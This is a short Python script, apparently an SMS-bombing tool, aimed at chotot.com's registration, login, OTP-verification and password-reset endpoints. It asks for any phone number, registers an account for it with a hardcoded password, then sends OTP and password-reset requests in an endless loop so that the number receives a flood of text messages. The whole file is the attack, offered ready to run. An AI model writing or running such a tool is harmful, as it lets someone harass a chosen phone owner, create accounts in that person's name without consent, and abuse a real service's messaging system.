#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json

def signup(phone): #phone = 0943687522
	link = "https://gateway.chotot.com/v1/public/auth/register"
	json = {"phone":"","password":"Th1sIsPwd@123","disable_otp":"false"}
	json["phone"] = phone
	data = requests.post(link,json=json).json()
	return(data)

def login(phone): #phone = 0943687522
	link = "https://accounts.chotot.com/api/login"
	json = {"phone":"","password":"Th1sIsPwd@123","rememberMe":"true","msess":"null","delaySetCookie":"false"}
	json["phone"] = phone
	data = requests.post(link,json=json).json()
	token = data["facebook_token"]
	return(token)
	
def sms(token):
	link = "https://gateway.chotot.com/v1/private/auth/send_otp_verify"
	headers = {"Authorization": ""}
	headers["Authorization"] = "Bearer " + token
	data = requests.post(link,headers=headers)
	return(data, data.text)

def resetPwd(phone): #phone = 0943687522
	link = "https://gateway.chotot.com/v1/public/auth/forget_password"
	json = {"phone":""}
	json["phone"] = phone
	data = requests.post(link,json=json)
	return(data,data.text)


phone = input(">_ Phone : ")

signup = signup(phone)

if "access_token" not in signup:
	count = 0
	while True:
		count = count + 1
		print(count,resetPwd(phone))
else:
	token = signup["access_token"]
	count = 0
	while True:
		count = count + 1
		print(count,sms(token))
		count = count + 1
		print(count,resetPwd(phone))

